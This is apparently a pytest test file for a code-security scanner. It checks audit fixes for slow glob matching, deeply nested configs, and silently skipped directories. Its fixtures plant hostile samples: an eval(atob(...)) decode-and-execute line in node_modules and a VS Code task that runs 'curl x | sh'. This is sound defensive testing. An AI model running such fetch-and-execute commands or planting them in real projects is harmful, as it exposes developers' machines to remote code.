"""The high-severity findings from the 2026-09-08 adversarial audit.

Two failure classes run through all of them: input that makes the scanner report
a clean result over code it did not examine, and input that makes the scanner
stop being available at all. The second is not a lesser version of the first --
operators respond to a scanner that hangs or crashes by adding `|| true`, and
that reaches the same place by a different route.
"""

from __future__ import annotations

import time
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config, ConfigResolver, RestrictedYamlParser
from cordon_scanner.core.errors import ConfigError
from cordon_scanner.core.walker import PathGlob

PAYLOAD = 'eval(atob("cGF5bG9hZA=="))\n'


class TestH3GlobMatchingIsLinear:
    """`**a**a**a**a` compiled to `^.*a.*a.*a.*a$`, whose cost grows with the
    fourth power of the path length: 0.2s at 168 characters, days at the 4096
    bytes `max_path_bytes` permits, per path, against every path in the tree.

    Nothing could interrupt it. Both timeouts are checked between units and
    Python's `re` cannot be interrupted mid-match. Both halves were
    attacker-supplied: the pattern from a discovered config, the paths from
    directory names.
    """

    def test_a_pathological_pattern_is_fast(self) -> None:
        path = "/".join(["a" * 200] * 60) + "/x.js"
        started = time.monotonic()
        PathGlob.matches(path, "**a**a**a**a.zzz")
        assert time.monotonic() - started < 0.5, "matching is super-linear again"

    def test_cost_does_not_explode_with_length(self) -> None:
        """The shape of the growth, not just one measurement. Quartic growth
        over a 4x length increase is 256x; linear is 4x."""

        def cost(segments: int) -> float:
            path = "/".join(["a" * 200] * segments) + "/x.js"
            started = time.monotonic()
            for _ in range(3):
                PathGlob.matches(path, "**a**a**a**a.zzz")
            return time.monotonic() - started

        small, large = cost(5), cost(20)
        assert large < max(small * 40, 0.2), f"{small:.5f}s -> {large:.5f}s"

    @pytest.mark.parametrize(
        ("path", "pattern", "expected"),
        [
            ("src/app.py", "src/*.py", True),
            ("src/deep/app.py", "src/*.py", False),
            ("src/deep/app.py", "src/**/*.py", True),
            ("a/b/c.js", "**/*.js", True),
            ("c.js", "**/*.js", True),
            ("node_modules/x/y.js", "**/node_modules/**", True),
            ("app.py", "*.py", True),
            ("a/app.py", "*.py", False),
            ("x.txt", "x.???", True),
            ("src/a.py", "src/[ab].py", True),
            ("src/c.py", "src/[ab].py", False),
            ("src/c.py", "src/[!ab].py", True),
            ("corpus/x/y", "corpus/**", True),
            ("corpus", "corpus/**", False),
        ],
    )
    def test_semantics_are_unchanged(self, path: str, pattern: str, expected: bool) -> None:
        """A faster matcher that matches different things is not a fix. `*` must
        still not cross a separator: `src/*.py` matching `src/deep/app.py` would
        make an exclusion remove more than its author intended, which is the
        failure this module exists to prevent."""
        assert bool(PathGlob.compile(pattern).match(path)) is expected

    def test_a_reversed_character_range_is_a_config_error(self) -> None:
        """`[z-a]` used to reach the regex engine and report "This is a bug in
        cordon" with exit 2, for the user's own mistake."""
        with pytest.raises(ConfigError, match="reversed range"):
            PathGlob.compile("src/[z-a].py").match("src/a.py")


class TestH6ConfigNestingIsBounded:
    """The parser's docstring promised "depth is bounded, so a deeply nested
    file is a configuration error rather than a stack overflow", and no depth
    parameter existed. A 400 KB config of 900 indented keys produced
    `RecursionError` and exit 2 -- which reads as "the scanner broke", and
    pipelines treat a broken tool as skippable in a way they do not treat a
    finding.
    """

    def test_deep_block_nesting_is_refused(self) -> None:
        document = "\n".join(f"{' ' * i}k{i}:" for i in range(900)) + "\n  v: 1\n"
        with pytest.raises(ConfigError, match="nested more than"):
            RestrictedYamlParser._load_yaml_subset(document, source="probe")

    @pytest.mark.parametrize("depth", [100, 2_000, 20_000])
    def test_deep_flow_nesting_is_refused(self, depth: int) -> None:
        """Flow collections cost one byte per level rather than the n^2/2 of
        block indentation, so they reach the stack limit in a much smaller
        file."""
        with pytest.raises(ConfigError, match="nested more than"):
            RestrictedYamlParser._load_yaml_subset(
                "k: " + "[" * depth + "]" * depth, source="probe"
            )

    def test_a_hostile_config_does_not_crash_the_scan(self, tmp_path: Path) -> None:
        root = tmp_path / "pkg"
        root.mkdir()
        (root / "app.js").write_text("const a = 1;\n", encoding="utf-8")
        (root / "cordon.yaml").write_text(
            "\n".join(f"{' ' * i}k{i}:" for i in range(900)), encoding="utf-8"
        )
        with pytest.raises(ConfigError):
            ConfigResolver.resolve(root=root)

    def test_ordinary_nesting_still_parses(self) -> None:
        """A bound low enough to break real configuration is not a fix."""
        data = RestrictedYamlParser._load_yaml_subset(
            "scan:\n  limits:\n    max_files: 10\npolicy:\n  fail_on: [high]\n", source="probe"
        )
        assert data["scan"]["limits"]["max_files"] == 10


class TestH2PrunedDirectoriesAreVisible:
    """`node_modules`, `.venv` and `.vscode` were skipped without being counted,
    attributed or reported -- contradicting the walker's own opening statement
    that a file never walked is indistinguishable from one scanned and found
    clean.

    `node_modules` is the sharpest case: it is where an installed malicious
    dependency's code and lifecycle scripts live, so a scan run after
    `npm install` could not see the dependency code it was there to examine.
    """

    def repository(self, tmp_path: Path) -> Path:
        root = tmp_path / "repo"
        (root / "node_modules" / "evil").mkdir(parents=True)
        (root / ".vscode").mkdir()
        (root / "node_modules" / "evil" / "index.js").write_text(PAYLOAD, encoding="utf-8")
        (root / ".vscode" / "tasks.json").write_text(
            '{"version":"2.0.0","tasks":[{"command":"curl x | sh"}]}', encoding="utf-8"
        )
        (root / "app.js").write_text("const a = 1;\n", encoding="utf-8")
        return root

    def scan(self, root: Path, **overrides):
        config = Config.default().with_overrides(use_cache=False, **overrides)
        return Scanner(config).scan(root)

    def test_a_pruned_directory_is_reported(self, tmp_path: Path) -> None:
        result = self.scan(self.repository(tmp_path))
        pruned = [f for f in result.findings if f.rule_id == "POLICY.COVERAGE.PRUNED"]
        assert pruned, "the tree was silently narrowed"
        assert "node_modules" in pruned[0].message

    def test_the_report_says_how_to_reach_it(self, tmp_path: Path) -> None:
        result = self.scan(self.repository(tmp_path))
        pruned = next(f for f in result.findings if f.rule_id == "POLICY.COVERAGE.PRUNED")
        assert "--include" in pruned.remediation

    def test_an_explicit_include_reaches_inside(self, tmp_path: Path) -> None:
        """A default that cannot be overridden is not a default. Before this,
        asking for node_modules walked in and dropped every file, scanning
        nothing."""
        result = self.scan(self.repository(tmp_path), include=("node_modules/**",))
        assert "SUSPECT.DECODE_EXEC.001" in {f.rule_id for f in result.findings}
        assert result.stats.files_scanned >= 1

    def test_a_clean_repository_reports_nothing_extra(self, tmp_path: Path) -> None:
        """A note that fires on every repository is a note nobody reads."""
        root = tmp_path / "plain"
        root.mkdir()
        (root / "app.js").write_text("const a = 1;\n", encoding="utf-8")
        assert not [f for f in self.scan(root).findings if f.rule_id == "POLICY.COVERAGE.PRUNED"]
